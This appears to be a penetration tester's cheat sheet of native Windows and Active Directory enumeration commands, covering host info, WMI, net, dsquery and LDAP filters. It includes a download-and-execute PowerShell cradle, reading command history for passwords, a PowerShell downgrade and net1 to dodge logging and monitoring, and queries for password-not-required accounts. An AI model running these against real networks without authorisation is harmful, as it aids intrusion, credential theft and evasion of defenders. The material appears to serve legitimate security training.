## Host & Network Recon: Basic Commands

Here are some basic environmental commands to gather information about the host:

|Command|Result/Description|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints patches and hotfixes applied to the host|
|`ipconfig /all`|Prints network adapter state and configurations|
|`set`|Displays environment variables (CMD)|
|`echo %USERDOMAIN%`|Displays the domain name (CMD)|
|`echo %logonserver%`|Prints the name of the Domain Controller (CMD)|

You can also use:

```powershell
powershell

systeminfo
```

This command summarizes the host's information in one output, generating fewer logs.

---

## Harnessing PowerShell

PowerShell provides many built-in functions and modules for recon and administration.

|Cmdlet / Command|Description|
|---|---|
|`Get-Module`|Lists available modules loaded for use|
|`Get-ExecutionPolicy -List`|Prints execution policy settings for each scope|
|`Set-ExecutionPolicy Bypass -Scope Process`|Changes policy for current process only|
|`Get-ChildItem Env:|ft Key,Value`|
|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|Gets PowerShell history (may contain passwords)|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"`|Download and execute a file from the web (if allowed)|

**Example:**

```powershell
powershell

PS C:\htb> Get-Module
PS C:\htb> Get-ExecutionPolicy -List
PS C:\htb> whoami
PS C:\htb> Get-ChildItem Env: | ft key,value
```

---

## PowerShell Downgrade for Stealth

Older versions of PowerShell (v2.0 and below) do not support event logging. You can downgrade as follows:

```powershell
powershell

PS C:\htb> powershell.exe -version 2
```

Check your version:

```powershell
powershell

PS C:\htb> Get-host
```

> **Note:** The downgrade action itself is logged, but subsequent commands in v2.0 are not.

---

## Checking Defenses

### Firewall Status

```powershell
powershell

PS C:\htb> netsh advfirewall show allprofiles
```

### Windows Defender Status

From CMD:

```cmd
cmd

C:\htb> sc query windefend
```

From PowerShell:

```powershell
powershell

PS C:\htb> Get-MpComputerStatus
```

---

## Session Awareness

Check who is logged in:

```powershell
powershell

PS C:\htb> qwinsta
```

---

## Network Information

|Command|Description|
|---|---|
|`arp -a`|Lists all known hosts in the ARP table|
|`ipconfig /all`|Adapter settings|
|`route print`|Displays routing table|
|`netsh advfirewall show allprofiles`|Firewall status|

**Examples:**

```powershell
powershell

PS C:\htb> arp -a
PS C:\htb> route print
```

---

## Windows Management Instrumentation (WMI)

WMI is widely used for retrieving information and running administrative tasks.

|Command|Description|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Patch level and hotfixes|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Basic host info|
|`wmic process list /format:list`|List all processes|
|`wmic ntdomain list /format:list`|Domain and Domain Controllers info|
|`wmic useraccount list /format:list`|Info about local and domain accounts|
|`wmic group list /format:list`|Info about all local groups|
|`wmic sysaccount list /format:list`|Info about system accounts|

**Example:**

```powershell
powershell

PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainControllerAddress
```

---

## Net Commands

Net commands are useful for enumerating domain and local information.

|Command|Description|
|---|---|
|`net accounts`|Password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|List domain groups|
|`net group "Domain Admins" /domain`|List domain admin users|
|`net group "domain computers" /domain`|List PCs in the domain|
|`net group "Domain Controllers" /domain`|List domain controllers|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List domain admins|
|`net user <ACCOUNT_NAME> /domain`|Info about a domain user|
|`net user /domain`|List all domain users|
|`net user %username%`|Info about current user|
|`net share`|Check current shares|
|`net use x: \\computer\share`|Mount a share locally|
|`net view`|List computers|
|`net view /domain`|List PCs in the domain|

**Tip:** Use `net1` instead of `net` to evade some monitoring tools.

---

## Dsquery

`dsquery` is a command-line tool for finding Active Directory objects.

- Exists on hosts with the AD Domain Services Role or with `dsquery.dll` present.

### Examples

**User Search:**

```powershell
powershell

PS C:\htb> dsquery user
```

**Computer Search:**

```powershell
powershell

PS C:\htb> dsquery computer
```

**Wildcard Search:**

```powershell
powershell

PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

**Users with Specific Attributes (e.g., PASSWD_NOTREQD):**

```powershell
powershell

PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

**Domain Controllers (limit 5):**

```powershell
powershell

PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

---

## LDAP Filtering Explained

- `userAccountControl:1.2.840.113556.1.4.803:=8192`
    - OID `1.2.840.113556.1.4.803`: Bit must match completely (singular attribute)
    - OID `1.2.840.113556.1.4.804`: Any bit in the chain matches (multiple attributes)
    - OID `1.2.840.113556.1.4.1941`: For Distinguished Name, searches all ownership/membership

**Logical Operators:**

- `&` (AND), `|` (OR), `!` (NOT)

**Example:**

```plaintext
plaintext

(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

- Finds users with "Password Can't Change" attribute set.

```plaintext
plaintext

(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```

- Finds users **without** "Password Can't Change" attribute.

---

## Conclusion

Using only native Windows tools, you can perform a wide range of enumeration tasks in AD environments. These techniques are valuable for stealth, reporting, and when tool upload is not possible.